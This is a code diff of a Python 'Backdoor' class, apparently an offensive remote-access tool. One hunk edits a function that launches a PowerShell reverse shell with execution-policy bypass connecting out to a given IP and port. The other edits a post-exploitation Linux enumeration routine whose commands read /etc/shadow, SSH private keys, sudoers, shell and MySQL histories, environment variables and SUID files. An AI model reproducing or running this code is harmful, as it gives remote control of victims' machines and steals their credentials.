@@ -212,7 +212,7 @@ class Backdoor:
 
     def spawn(self,target_ip,target_port):
     	target_ip = socket.gethostbyname(target_ip)
-        spawner=""" powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('""" + str(target_ip) + """',""" + str(target_port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""
+        spawner="""powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('""" + str(target_ip) + """',""" + str(target_port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""
         try:
             subprocess.Popen(spawner,shell=True)
             return "[+] powershell session spawned successfully check your listener [+]"
@@ -277,57 +277,47 @@ class Backdoor:
 # post exploitation enumeration function for linux............................................................................
     def linux_enum(self):
         system = {"/etc/issue ": "cat /etc/issue",
-                  "available shells on system":'cat /etc/shells |grep "bin"|cut -d "/" -f3 2>/dev/null ',
+                  "available shells on system":'cat /etc/shells |grep "bin"|cut -d "/" -f3 2>/dev/null | sort -u',
             "OS kernel and version ":"cat /proc/version && uname -mrs && dmesg | grep Linux && ls /boot | grep vmlinuz-",
             "hostname ": "hostname",
             "release ": "cat /etc/*-release",
-            "driver info ":"modinfo  `lsmod` 2>&1 | uniq | grep -v alias | grep -v modinfo | grep -v parm | grep -v intree | grep -v license | grep -v author | grep -v retpoline | grep -v depends | grep -v firmware:",
-        "available programming languages":'progr_dev=( "which perl" "which gcc" "which g++"  "which python" "which php" "which cc" "which go" "which node") ;for programmin_lang in "${progr_dev[@]}"; do pss=`$programmin_lang |cut -d"/" -f4` ;if [ "$pss" ];  then echo -e "$pss" ;fi done',
-                  "system logs ( last 60 )":"tail -n 60 /var/log/syslog",
+        "available programming languages":'progr_dev=( "which perl" "which gcc" "which g++"  "which python" "which php" "which cc" "which go" "which node") ;for programming_lang in "${progr_dev[@]}"; do pss=`$programming_lang |cut -d"/" -f4` ;if [ "$pss" ];  then echo -e "$pss" ;fi done',
                   "log files":"ls -haltrZ /var/log"}
         user_accounts = {"users":"cat /etc/passwd | cut -d: -f1  ",
             "emails":"mail && ls -alh /var/mail/",
-            "id": "id", "/etc/passwd": "cat /etc/passwd",
+            "id": "id", "/etc/passwd & /etc/shadow access": "ls -la /etc/passwd /etc/shadow",
             "sudo version":"sudo -V",
-            "/etc/shadow": "cat /etc/shadow",
-            "other shadow files":"find / -iname 'shadow*' -path /mnt -prune 2>/dev/null",
             "super users": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'",
-            "check for sudo access with <sudo -l>": " ",
+            "check for sudo access with <sudo -l>": "sudo -l",
             "logged in accounts": "w",
             "last loggins": "last",
-            "command history ( last 60 )": " tail -n 60 ~/.bash_history",
+            "command history ( last 30 )": " tail -n 30 ~/.bash_history",
             "sudoers": "cat /etc/sudoers 2>/dev/null | grep -v '#'",
             "environment variables": "env 2>/dev/null | grep -v 'LS_COLORS'"}
         processes = {"mysql command history":"cat ~/.mysql_history",
-                        "running processes": "ps -ef",
                      "root services": "ps -ef | grep root",
                      "apt cached packages": "ls -alh /var/cache/apt/archives",
                      "yum cached packages": "ls -alh /var/cache/yum/",
                      "rpm packages": "rpm -qa",
                      "printer status": "lpstat -a",
-                     "apache version and modules":"apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null",
-                     "apache config file":"cat /etc/apache2/apache2.conf | grep -v '#' 2>/dev/null"}
+                     "apache version and modules":"apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null"}
         network = {"hosts and DNS":"cat /etc/hosts 2>/dev/null && cat /etc/resolv.conf 2>/dev/null && cat /etc/sysconfig/network 2>/dev/null && cat /etc/networks 2>/dev/null | uniq | srt | grep -v '#'",
                     "domain name":"dnsdomainname",
-                    "root login status":"cat /etc/ssh/sshd_config | grep PermitRootLogin",
-                   "ssh info":" cat ~/.ssh/identity.pub  ~/.ssh/authorized_keys ~/.ssh/identity ~/.ssh/id_rsa.pub ~/.ssh/id_rsa ~/.ssh/id_dsa.pub ~/.ssh/id_dsa /etc/ssh/ssh_config /etc/ssh/sshd_config /etc/ssh/ssh_host_dsa_key.pub /etc/ssh/ssh_host_dsa_key /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa_key /etc/ssh/ssh_host_key.pub /etc/ssh/ssh_host_key 2>/dev/null",
-                    "interfaces": "/sbin/ifconfig -a",
+                    "root login status":"cat /etc/ssh/sshd_config | grep PermitRootLogin | grep -v '#'",
+                   "interfaces": "/sbin/ifconfig -a",
                    "network routes": "route",
                    "all users communications":"lsof -i",
                    "connections status": "netstat -antup ",
                    "firewall ":"iptables -L 2>/dev/null && ls /etc/iptables 2>/dev/null"}
         file_system = {"/var/www/ content":"ls -alhR /var/www/",
-                        "writable files":"find / -type f -writable -path /sys -prune -o -path /proc /mnt -prune -o -path /usr /mnt -prune -o -path /lib /mnt -prune -o -type d 2>/dev/null",
-                        "last modified files/directories":"find /etc -path /mnt -prune -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r",
-                        "mounted devices": "mount",
-                       "/etc/fstab": "cat /etc/fstab",
+                       "/etc/fstab": "cat /etc/fstab | grep -v '#'",
                        "aARP table":"arp -e",
                        "disks": "fdisk -l",
                        "mounted disks":"df -h",
-                       "find SUID files/directories":" find / -user root -perm -4000  -path /mnt -prune -type -print 2>/dev/null"
+                       "SUID / SGID files":"find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2>/dev/null"
                        }
         scheduled_jobs = {"cron jobs": "crontab -l | grep -v '#'",
-                        "cronw jobs": "ls -aRl /etc/cron* 2>/dev/null"}
+                          "crontab":"cat /etc/crontab | grep -v '#'"}
 
         # headers for each data section..........................................................................................
         system_info = yellow, "\n#### OS and version information ###################################################\n\n", r
